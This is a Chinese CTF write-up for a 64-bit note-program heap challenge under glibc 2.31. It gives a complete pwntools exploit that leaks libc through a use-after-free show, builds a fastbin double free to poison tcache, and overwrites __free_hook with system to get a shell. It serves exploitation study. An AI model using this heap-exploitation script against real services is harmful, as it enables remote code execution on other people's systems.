# week4week4_pwn2(from:0xdeadc0de)

## 题目简述

第二题沿用相同的 64 位 note 程序和保护配置，但菜单中的 `edit` 是假选项，二进制内没有真正的编辑函数。`delete()` 仍然不清空指针，因而可以释放后显示或重复释放同一堆块。目标是在缺少直接 UAF 写的情况下，通过 fastbin dup 构造 tcache poisoning。

## 解题过程

libc 泄漏与第一题相同：申请 `0x800` 大块并用后续小块隔开，释放后通过残留指针 `show()` 读取 unsorted-bin 的 `main_arena` 指针。仍使用题目 glibc 2.31 的三个偏移：

~~~text
main_arena 泄漏位置：0x1ecbe0
__free_hook：         0x1eee48
system：              0x52290
~~~

区别在任意写的构造。glibc 2.31 的每个 tcache bin 默认最多保存 7 个 chunk，因此先申请 9 个相同大小的小块，再依次释放：

- chunk 0–6 填满 `0x20` 大小的 tcache bin；
- chunk 7、8 因 tcache 已满而进入 fastbin，链为 `8 → 7`；
- 再次释放 chunk 7 时，fastbin 当前链头是 chunk 8，不等于待释放的 chunk 7，因而绕过“不能连续释放同一链头”的检查，形成 `7 → 8 → 7` 循环。

这个顺序也避开了 tcache 自身的 double-free key 检查，因为第二次释放 chunk 7 时它走的是 fastbin。接着申请 7 次先排空 tcache；后续申请会从带重复节点的 fastbin 链取块并回填 tcache。把 `__free_hook` 写入重复 chunk 的链指针位置，再消耗中间节点，最终让一次 `malloc` 返回 `__free_hook` 并写入 `system`。

完整 exploit 如下：

~~~python
import sys

from pwn import context, p64, remote, u64

context.arch = "amd64"

host = sys.argv[1]
port = int(sys.argv[2])
io = remote(host, port)

MENU_END = b"4.edit a node\n"


def choose(number):
    io.sendlineafter(MENU_END, str(number).encode())


def add(index, size, content):
    choose(1)
    io.sendlineafter(b"Please input index\n", str(index).encode())
    io.sendlineafter(b"Please input size\n", str(size).encode())
    io.sendafter(b"Please input content\n", content)


def delete(index):
    choose(2)
    io.sendlineafter(b"Please input index\n", str(index).encode())


def show(index):
    choose(3)
    io.sendlineafter(b"Please input index\n", str(index).encode())
    return io.recvline(keepends=False)


add(0, 0x800, b"large")
add(10, 0x10, b"/bin/sh\x00")
delete(0)

arena_pointer = u64(show(0).ljust(8, b"\x00")[:8])
libc_base = arena_pointer - 0x1ECBE0
free_hook = libc_base + 0x1EEE48
system = libc_base + 0x52290

# 9 个 0x20 chunk：前 7 个进入 tcache，后 2 个进入 fastbin。
for index in range(9):
    add(index, 0x10, b"A" * 8)
for index in range(9):
    delete(index)

# fastbin 原为 8 → 7；再次 free(7) 后形成 7 → 8 → 7。
delete(7)

# 排空原 tcache，使后续分配处理 fastbin dup 链。
for index in range(20, 27):
    add(index, 0x10, b"drain")

add(27, 0x10, p64(free_hook))
add(28, 0x10, b"padding1")
add(29, 0x10, b"padding2")
add(30, 0x10, p64(system))

delete(10)
io.interactive()
~~~

最后一次 `delete(10)` 会经由 `__free_hook` 调用 `system("/bin/sh")`，进入 shell 后读取 flag。

## 方法总结

本题通过移除 edit 原语迫使利用方式从“直接改 tcache 链”变成“先构造 fastbin dup，再借分配过程污染 tcache”。关键是理解 tcache 容量为 7、溢出 chunk 才进入 fastbin，以及 fastbin 只拒绝与当前链头相同的连续 double free。该链依赖题目使用的 glibc 2.31；更高版本的 safe-linking 和 hook 移除会改变利用方式。
